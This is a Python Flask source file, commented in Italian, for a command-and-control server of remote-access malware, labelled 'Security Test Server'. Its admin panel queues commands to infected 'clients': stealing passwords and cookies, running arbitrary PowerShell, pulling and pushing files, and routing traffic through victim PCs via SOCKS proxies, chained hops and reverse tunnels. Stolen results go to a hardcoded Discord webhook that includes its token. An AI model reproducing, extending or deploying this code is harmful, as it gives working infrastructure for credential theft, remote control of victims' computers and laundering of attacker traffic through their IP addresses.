from flask import Flask, request, jsonify, send_file
import threading
import time
import json
import requests
from datetime import datetime
import os
import hashlib
import uuid

app = Flask(__name__)

# Configurazione Discord
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1435284134162464900/avJVpeaibF4iQyUlrD73-2JFZvpmNtZWeX-Cmbot3QU3tadH1wxjuOuZ-c7f9FsckPSt"  # ⚠️ SOSTITUISCI
CURRENT_VERSION = "1.4.0"  # 🆕 Versione con Reverse Tunnel

class ClientManager:
    def __init__(self):
        self.clients = {}
        self.next_client_id = 1
        self.lock = threading.Lock()
        self.commands_queue = {}
        self.client_fingerprints = {}
        self.tunnel_commands = {}  # 🆕 CODA COMANDI TUNNEL
        self.active_tunnels = {}   # 🆕 TUNNEL ATTIVI
    
    def generate_fingerprint(self, client_data, ip_address):
        fingerprint_str = f"{client_data.get('hostname','')}{ip_address}{client_data.get('username','')}"
        return hashlib.md5(fingerprint_str.encode()).hexdigest()
    
    def get_real_client_ip(self, request):
        """🆕 Ottiene il vero IP del client"""
        if request.headers.get('X-Forwarded-For'):
            return request.headers.get('X-Forwarded-For').split(',')[0]
        elif request.headers.get('X-Real-IP'):
            return request.headers.get('X-Real-IP')
        else:
            return request.remote_addr
    
    def add_client(self, client_data, ip_address):
        with self.lock:
            fingerprint = self.generate_fingerprint(client_data, ip_address)
            
            if fingerprint in self.client_fingerprints:
                client_id = self.client_fingerprints[fingerprint]
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint,
                    "public_ip": client_data.get('public_ip', 'unknown')  # 🆕 IP PUBBLICO
                }
                return client_id
            else:
                client_id = self.next_client_id
                self.clients[client_id] = {
                    "data": client_data,
                    "last_seen": datetime.now(),
                    "ip": ip_address,
                    "fingerprint": fingerprint,
                    "public_ip": client_data.get('public_ip', 'unknown')  # 🆕 IP PUBBLICO
                }
                self.client_fingerprints[fingerprint] = client_id
                self.next_client_id += 1
                return client_id
    
    def remove_client(self, client_id):
        with self.lock:
            if client_id in self.clients:
                fingerprint = self.clients[client_id].get("fingerprint")
                if fingerprint in self.client_fingerprints:
                    del self.client_fingerprints[fingerprint]
                del self.clients[client_id]
            if client_id in self.commands_queue:
                del self.commands_queue[client_id]
            if client_id in self.tunnel_commands:
                del self.tunnel_commands[client_id]
            if client_id in self.active_tunnels:
                del self.active_tunnels[client_id]
    
    def get_client(self, client_id):
        with self.lock:
            return self.clients.get(client_id)
    
    def list_clients(self):
        with self.lock:
            return self.clients.copy()
    
    def add_command(self, client_id, command):
        with self.lock:
            if client_id not in self.commands_queue:
                self.commands_queue[client_id] = []
            self.commands_queue[client_id].append(command)
    
    def get_command(self, client_id):
        with self.lock:
            if client_id in self.commands_queue and self.commands_queue[client_id]:
                return self.commands_queue[client_id].pop(0)
            return None
    
    # 🆕 METODI PER REVERSE TUNNEL
    def add_tunnel_command(self, client_id, tunnel_command):
        with self.lock:
            if client_id not in self.tunnel_commands:
                self.tunnel_commands[client_id] = []
            self.tunnel_commands[client_id].append(tunnel_command)
    
    def get_tunnel_command(self, client_id):
        with self.lock:
            if client_id in self.tunnel_commands and self.tunnel_commands[client_id]:
                return self.tunnel_commands[client_id].pop(0)
            return None
    
    def create_tunnel(self, client_id, target_host, target_port):
        """🆕 Crea un nuovo tunnel e restituisce l'ID"""
        tunnel_id = str(uuid.uuid4())
        with self.lock:
            self.active_tunnels[tunnel_id] = {
                'client_id': client_id,
                'target_host': target_host,
                'target_port': target_port,
                'status': 'pending',
                'created_at': datetime.now()
            }
        return tunnel_id
    
    def update_tunnel_status(self, tunnel_id, status, error=None):
        """🆕 Aggiorna lo stato di un tunnel"""
        with self.lock:
            if tunnel_id in self.active_tunnels:
                self.active_tunnels[tunnel_id]['status'] = status
                if error:
                    self.active_tunnels[tunnel_id]['error'] = error
                self.active_tunnels[tunnel_id]['updated_at'] = datetime.now()

client_manager = ClientManager()

def send_to_discord(message, data_type="SERVER"):
    try:
        payload = {
            "content": f"🔐 **[{data_type}]** {message}",
            "username": "SecurityBot",
            "avatar_url": "https://cdn-icons-png.flaticon.com/512/6001/6001368.png"
        }
        headers = {
            "Content-Type": "application/json"
        }
        response = requests.post(DISCORD_WEBHOOK, json=payload, headers=headers, timeout=10)
        return response.status_code == 204
    except Exception as e:
        print(f"Discord error: {e}")
        return False

# 🆕 ROTTE PER REVERSE TUNNEL
@app.route('/api/reverse_tunnel_wait', methods=['GET'])
def reverse_tunnel_wait():
    """🆕 Il client si connette qui e aspetta istruzioni di tunneling"""
    client_id = request.args.get('client_id')
    
    if not client_id:
        return jsonify({"status": "error", "message": "client_id required"})
    
    # Aspetta fino a 55 secondi per un comando di tunnel
    start_time = time.time()
    while time.time() - start_time < 15:
        tunnel_command = client_manager.get_tunnel_command(int(client_id))
        if tunnel_command:
            send_to_discord(f"🔁 Tunnel attivato per client {client_id} -> {tunnel_command['target_host']}:{tunnel_command['target_port']}")
            return jsonify(tunnel_command)
        time.sleep(1)
    
    # Timeout - restituisce keepalive
    return jsonify({"type": "keepalive"})

@app.route('/api/tunnel_result', methods=['POST'])
def tunnel_result():
    """🆕 Il client notifica il risultato del tunnel"""
    try:
        data = request.json
        tunnel_id = data.get('tunnel_id')
        status = data.get('status')
        error = data.get('error')
        client_id = data.get('client_id')
        
        client_manager.update_tunnel_status(tunnel_id, status, error)
        
        if status == 'connected':
            send_to_discord(f"✅ Tunnel {tunnel_id} connesso con successo")
        else:
            send_to_discord(f"❌ Tunnel {tunnel_id} fallito: {error}")
        
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/proxy_through_client', methods=['POST'])
def proxy_through_client():
    """🆕 Il TUO PC usa questo per inoltrare traffico attraverso PC1"""
    try:
        data = request.json
        client_id = data.get('client_id')
        target_host = data.get('target_host', 'www.google.com')
        target_port = data.get('target_port', 443)
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"})
        
        # Crea un nuovo tunnel
        tunnel_id = client_manager.create_tunnel(int(client_id), target_host, target_port)
        
        # Invia comando al client
        client_manager.add_tunnel_command(int(client_id), {
            'type': 'proxy_request',
            'target_host': target_host,
            'target_port': target_port,
            'tunnel_id': tunnel_id
        })
        
        send_to_discord(f"🌐 Proxy tunnel richiesto: {target_host}:{target_port} attraverso client {client_id}")
        
        # Aspetta che il tunnel sia connesso
        for _ in range(10):
            time.sleep(1)
            tunnel_info = client_manager.active_tunnels.get(tunnel_id, {})
            if tunnel_info.get('status') == 'connected':
                return jsonify({
                    "status": "success", 
                    "tunnel_id": tunnel_id,
                    "message": f"Tunnel connected to {target_host}:{target_port}"
                })
            elif tunnel_info.get('status') == 'failed':
                return jsonify({
                    "status": "error", 
                    "message": f"Tunnel failed: {tunnel_info.get('error', 'Unknown error')}"
                })
        
        return jsonify({
            "status": "timeout", 
            "message": "Tunnel connection timeout"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/test_google_login/<int:client_id>')
def test_google_login(client_id):
    """🆕 Testa il login Google attraverso il client specificato"""
    try:
        # Attiva il tunnel verso Google
        tunnel_response = proxy_through_client()
        
        if tunnel_response.json.get('status') != 'success':
            return f"Tunnel failed: {tunnel_response.json.get('message')}"
        
        # Qui puoi implementare la logica per fare richieste HTTP attraverso il tunnel
        # Per ora restituiamo solo lo stato
        return f'''
        <h3>Google Login Test</h3>
        <p>Client: {client_id}</p>
        <p>Tunnel Status: {tunnel_response.json.get('message')}</p>
        <p>Google dovrebbe vedere l'IP di PC2</p>
        <a href="/proxy_control">Back to Proxy Control</a>
        '''
    except Exception as e:
        return f"Error: {str(e)}"

@app.route('/')
def home():
    clients_count = len(client_manager.list_clients())
    return f"""
    <h1>Security Test Server v{CURRENT_VERSION}</h1>
    <p>PythonAnywhere + Reverse Tunnel + SOCKS Proxy</p>
    <p>Client connessi: {clients_count}</p>
    <p><a href="/admin">Admin Panel</a></p>
    <p><a href="/proxy_control">🔌 Proxy Control</a></p>
    <p><a href="/api/clients">API Clients</a></p>
    <p><a href="/tunnel_test">🧪 Test Reverse Tunnel</a></p>
    """

@app.route('/tunnel_test')
def tunnel_test():
    """🆕 Pagina per testare il reverse tunnel"""
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} (IP: {info.get("public_ip", "unknown")})</option>'
    
    return f'''
    <h2>🧪 Reverse Tunnel Test v{CURRENT_VERSION}</h2>
    
    <h3>🚀 Test Google Through Client</h3>
    <form action="/api/proxy_through_client" method="post" id="tunnelForm">
        <label>Select Client (PC1):</label>
        <select name="client_id" id="clientSelect">
            {clients_html}
        </select><br>
        
        <label>Target Host:</label>
        <input type="text" name="target_host" value="www.google.com"><br>
        
        <label>Target Port:</label>
        <input type="number" name="target_port" value="443"><br><br>
        
        <button type="button" onclick="testTunnel()">Test Tunnel Connection</button>
    </form>
    
    <div id="result" style="margin-top: 20px;"></div>
    
    <script>
    function testTunnel() {{
        const clientId = document.getElementById('clientSelect').value;
        const targetHost = document.querySelector('input[name="target_host"]').value;
        const targetPort = document.querySelector('input[name="target_port"]').value;
        
        fetch('/api/proxy_through_client', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify({{
                client_id: clientId,
                target_host: targetHost,
                target_port: targetPort
            }})
        }})
        .then(response => response.json())
        .then(data => {{
            document.getElementById('result').innerHTML = 
                '<h3>Result:</h3><pre>' + JSON.stringify(data, null, 2) + '</pre>';
        }});
    }}
    </script>
    
    <p><a href="/proxy_control">Back to Proxy Control</a></p>
    '''

@app.route('/admin')
def admin_panel():
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")}</option>'
    
    return f'''
    <h2>Admin Control Panel v{CURRENT_VERSION}</h2>
    
    <h3>📋 Comandi Predefiniti</h3>
    <form action="/send_command" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        
        <label>Command:</label>
        <select name="command">
            <option value="passwords">Get Passwords</option>
            <option value="cookies">Get Cookies</option>
            <option value="systeminfo">System Info</option>
            <option value="start_reverse_tunnel">Start Reverse Tunnel</option>
            <option value="stop_reverse_tunnel">Stop Reverse Tunnel</option>
        </select><br><br>
        
        <button type="submit">Send Command</button>
    </form>

    <h3>⚡ PowerShell Live</h3>
    <form action="/send_powershell" method="post">
        <label>Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        
        <label>PowerShell Command:</label><br>
        <textarea name="powershell_command" rows="3" cols="50" placeholder="Enter any PowerShell command..."></textarea><br><br>
        
        <button type="submit">Execute PowerShell</button>
    </form>

    <h3>📁 File Operations</h3>
    <form action="/download_file" method="post">
        <label>Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br>
        
        <label>File Path:</label>
        <input type="text" name="file_path" placeholder="C:\path\to\file.txt" style="width: 300px;"><br><br>
        
        <button type="submit">Download File from Client</button>
    </form>

    <p><a href="/proxy_control">🔌 SOCKS Proxy Control</a></p>
    <p><a href="/upload_files">📤 Upload Files to Clients</a></p>
    <p><a href="/tunnel_test">🧪 Test Reverse Tunnel</a></p>
    <p><a href="/api/clients">View All Clients (JSON)</a></p>
    '''

@app.route('/proxy_control')
def proxy_control():
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")} (IP: {info.get("public_ip", "unknown")})</option>'
    
    return f'''
    <h2>🔌 SOCKS Proxy Control v{CURRENT_VERSION}</h2>
    
    <h3>🚀 Start SOCKS Proxy</h3>
    <form action="/api/start_socks_proxy" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br>
        
        <label>Port (default 1080):</label>
        <input type="number" name="port" value="1080"><br>
        
        <label>Next Hop (for proxy chain - optional):</label>
        <input type="text" name="next_hop" placeholder="192.168.1.100" style="width: 200px;"><br><br>
        
        <button type="submit">Start SOCKS Proxy</button>
    </form>

    <h3>🛑 Stop SOCKS Proxy</h3>
    <form action="/api/stop_socks_proxy" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        <button type="submit">Stop SOCKS Proxy</button>
    </form>

    <h3>🌐 Test Proxy Chain</h3>
    <form action="/api/test_proxy_chain" method="post">
        <label>PC1 (First Hop):</label>
        <select name="pc1_id">
            {clients_html}
        </select><br>
        
        <label>PC2 (Second Hop):</label>
        <select name="pc2_id">
            {clients_html}
        </select><br><br>
        
        <button type="submit">Test Proxy Chain</button>
    </form>

    <h3>🔍 Get Client IP</h3>
    <form action="/api/get_client_ip" method="post">
        <label>Select Client:</label>
        <select name="client_id">
            {clients_html}
        </select><br><br>
        <button type="submit">Get Public IP</button>
    </form>

    <h3>🧪 Test Reverse Tunnel</h3>
    <p><a href="/tunnel_test">Test Tunnel Connection to Google</a></p>

    <p><a href="/admin">Back to Admin</a></p>
    '''

@app.route('/api/start_socks_proxy', methods=['POST'])
def start_socks_proxy():
    client_id = request.form.get('client_id')
    port = request.form.get('port', 1080)
    next_hop = request.form.get('next_hop')
    
    if client_id:
        command = f"start_socks|{port}|{next_hop}" if next_hop else f"start_socks|{port}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"🔌 SOCKS proxy avviato su client {client_id}" + (f" -> {next_hop}" if next_hop else ""))
    
    return f'''
    <h3>SOCKS Proxy Started!</h3>
    <p>Client: {client_id}</p>
    <p>Port: {port}</p>
    <p>Next Hop: {next_hop if next_hop else 'Direct'}</p>
    <a href="/proxy_control">Back to Proxy Control</a>
    '''

@app.route('/api/stop_socks_proxy', methods=['POST'])
def stop_socks_proxy():
    client_id = request.form.get('client_id')
    
    if client_id:
        client_manager.add_command(int(client_id), "stop_socks")
        send_to_discord(f"🛑 SOCKS proxy fermato su client {client_id}")
    
    return f'''
    <h3>SOCKS Proxy Stopped!</h3>
    <p>Client: {client_id}</p>
    <a href="/proxy_control">Back to Proxy Control</a>
    '''

@app.route('/api/get_client_ip', methods=['POST'])
def get_client_ip():
    client_id = request.form.get('client_id')
    
    if client_id:
        client_manager.add_command(int(client_id), "get_public_ip")
        send_to_discord(f"🔍 Richiesto IP pubblico per client {client_id}")
    
    return f'''
    <h3>IP Request Sent!</h3>
    <p>Client: {client_id}</p>
    <p>Check Discord for results</p>
    <a href="/proxy_control">Back to Proxy Control</a>
    '''

@app.route('/api/test_proxy_chain', methods=['POST'])
def test_proxy_chain():
    pc1_id = request.form.get('pc1_id')
    pc2_id = request.form.get('pc2_id')
    
    if pc1_id and pc2_id:
        client_manager.add_command(int(pc2_id), "start_socks|1080")
        
        pc2_data = client_manager.get_client(int(pc2_id))
        if pc2_data:
            pc2_ip = pc2_data['ip']
            client_manager.add_command(int(pc1_id), f"start_socks|1080|{pc2_ip}")
            
            send_to_discord(f"🔗 Proxy chain avviata: PC1 ({pc1_id}) -> PC2 ({pc2_id})")
            
            return f'''
            <h3>Proxy Chain Started!</h3>
            <p>PC1: {pc1_id} -> PC2: {pc2_id}</p>
            <p>Chain: PythonAnywhere → PC1 → PC2 → Internet</p>
            <a href="/proxy_control">Back to Proxy Control</a>
            '''
    
    return "Error: Clients not found"

@app.route('/access_google/<int:pc1_id>/<int:pc2_id>')
def access_google(pc1_id, pc2_id):
    try:
        pc1_data = client_manager.get_client(pc1_id)
        pc2_data = client_manager.get_client(pc2_id)
        
        if not pc1_data or not pc2_data:
            return "Error: Clients not found"
        
        pc1_ip = pc1_data['ip']
        
        proxies = {
            'http': f'socks5://{pc1_ip}:1080',
            'https': f'socks5://{pc1_ip}:1080'
        }
        
        response = requests.get('https://www.google.com', proxies=proxies, timeout=30)
        return response.text
        
    except Exception as e:
        return f"Error accessing Google through proxy chain: {str(e)}"

@app.route('/send_command', methods=['POST'])
def send_command_web():
    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if client_id and command:
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"🌐 Comando web '{command}' per client {client_id}")

    return f'''
    <h3>Command Sent!</h3>
    <p>Command: {command} to Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/send_powershell', methods=['POST'])
def send_powershell():
    client_id = request.form.get('client_id')
    powershell_command = request.form.get('powershell_command')

    if client_id and powershell_command:
        command = f"powershell_live:{powershell_command}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"⚡ PowerShell: {powershell_command[:100]}... per client {client_id}")

    return f'''
    <h3>PowerShell Command Sent!</h3>
    <p>Command: {powershell_command}</p>
    <p>To Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/download_file', methods=['POST'])
def download_file():
    client_id = request.form.get('client_id')
    file_path = request.form.get('file_path')

    if client_id and file_path:
        command = f"download_file:{file_path}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"📥 Download richiesto: {file_path} da client {client_id}")

    return f'''
    <h3>Download Request Sent!</h3>
    <p>File: {file_path}</p>
    <p>From Client: {client_id}</p>
    <a href="/admin">Back to Admin</a>
    '''

@app.route('/api/upload_file', methods=['POST'])
def upload_file():
    try:
        client_id = request.form.get('client_id')
        file_path = request.form.get('file_path')
        
        if 'file' not in request.files:
            return jsonify({"status": "error", "message": "No file uploaded"})
        
        file = request.files['file']
        safe_filename = os.path.basename(file_path) if file_path else f"upload_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.dat"
        
        uploads_dir = "uploads"
        os.makedirs(uploads_dir, exist_ok=True)
        
        file.save(os.path.join(uploads_dir, safe_filename))
        
        send_to_discord(f"📤 File uploadato da client {client_id}: {safe_filename}")
        
        return jsonify({"status": "success", "message": f"File {safe_filename} uploaded"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/check_update', methods=['GET'])
def check_update():
    client_version = request.args.get('version', '1.0.0')
    
    if client_version != CURRENT_VERSION:
        return jsonify({
            "status": "update_available",
            "current_version": CURRENT_VERSION,
            "message": "New version available"
        })
    else:
        return jsonify({
            "status": "up_to_date", 
            "message": "Client is up to date"
        })

@app.route('/api/register', methods=['POST'])
def register_client():
    try:
        client_data = request.json
        client_ip = client_manager.get_real_client_ip(request)  # 🆕 IP REALE
        client_id = client_manager.add_client(client_data, client_ip)
        
        public_ip = client_data.get('public_ip', 'unknown')
        
        send_to_discord(f"🟢 Client {client_id} registrato - {client_data.get('hostname', 'Unknown')} - IP: {public_ip}")
        
        return jsonify({
            "status": "success",
            "client_id": client_id,
            "message": "Client registered successfully"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/check_commands', methods=['GET'])
def check_commands():
    try:
        client_id = request.args.get('client_id')
        
        if not client_id:
            return jsonify({"status": "error", "message": "client_id required"})
        
        command = client_manager.get_command(int(client_id))
        
        return jsonify({
            "status": "success",
            "command": command,
            "message": "Command check completed"
        })
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/results', methods=['POST'])
def receive_results():
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        results = data.get('results')
        
        results_preview = str(results)[:1500]
        send_to_discord(f"📊 Risultati da client {client_id} - {command}:\n```{results_preview}```")
        
        filename = f"results_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        
        return jsonify({"status": "success", "message": "Results received"})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/clients', methods=['GET'])
def list_clients():
    clients = client_manager.list_clients()
    return jsonify({
        "status": "success",
        "clients": {
            cid: {
                "data": info["data"],
                "last_seen": info["last_seen"].isoformat(),
                "ip": info["ip"],
                "public_ip": info.get("public_ip", "unknown"),  # 🆕 IP PUBBLICO
                "fingerprint": info.get("fingerprint", "unknown")
            } for cid, info in clients.items()
        }
    })

@app.route('/api/available_files', methods=['GET'])
def available_files():
    try:
        files_dir = "uploads"
        available = []
        if os.path.exists(files_dir):
            for filename in os.listdir(files_dir):
                file_path = os.path.join(files_dir, filename)
                if os.path.isfile(file_path):
                    available.append({
                        "name": filename,
                        "size": os.path.getsize(file_path),
                        "modified": os.path.getmtime(file_path)
                    })
        return jsonify({"status": "success", "files": available})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/api/download_file/<filename>', methods=['GET'])
def download_file_server(filename):
    try:
        safe_filename = os.path.basename(filename)
        return send_file(f"uploads/{safe_filename}", as_attachment=True)
    except:
        return jsonify({"status": "error", "message": "File not found"})

@app.route('/upload_files')
def upload_files_interface():
    clients = client_manager.list_clients()
    clients_html = ""
    for client_id, info in clients.items():
        clients_html += f'<option value="{client_id}">Client {client_id} - {info["data"].get("hostname", "Unknown")}</option>'
    
    available_files = []
    try:
        files_dir = "uploads"
        if os.path.exists(files_dir):
            available_files = [f for f in os.listdir(files_dir) if os.path.isfile(os.path.join(files_dir, f))]
    except:
        pass
    
    files_html = ""
    for file in available_files[:10]:
        files_html += f'<option value="{file}">{file}</option>'
    
    return f'''
    <h2>📤 Upload File to Clients</h2>
    <form action="/send_upload_command" method="post">
        <label>Select Client:</label>
        <select name="client_id">{clients_html}</select><br><br>
        <label>Select File:</label>
        <select name="filename">{files_html}</select><br><br>
        <label>Destination Path:</label>
        <input type="text" name="destination" value="C:\\temp\\" style="width: 300px;"><br><br>
        <button type="submit">📤 Upload File to Client</button>
    </form>
    <p><a href="/admin">Back to Admin</a></p>
    '''

@app.route('/send_upload_command', methods=['POST'])
def send_upload_command():
    client_id = request.form.get('client_id')
    filename = request.form.get('filename')
    destination = request.form.get('destination')
    
    if client_id and filename and destination:
        command = f"upload_file|{filename}|{destination}"
        client_manager.add_command(int(client_id), command)
        send_to_discord(f"📤 Upload richiesto: {filename} → {destination} su client {client_id}")
    
    return f'''
    <h3>Upload Command Sent!</h3>
    <p>File: {filename}</p>
    <p>Destination: {destination}</p>
    <p>To Client: {client_id}</p>
    <a href="/upload_files">Back to Upload</a>
    '''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    os.makedirs("uploads", exist_ok=True)
    os.makedirs("downloads", exist_ok=True)
    
    send_to_discord(f"🚀 Server v{CURRENT_VERSION} avviato su PythonAnywhere")
    app.run(host='0.0.0.0', port=port, debug=False)
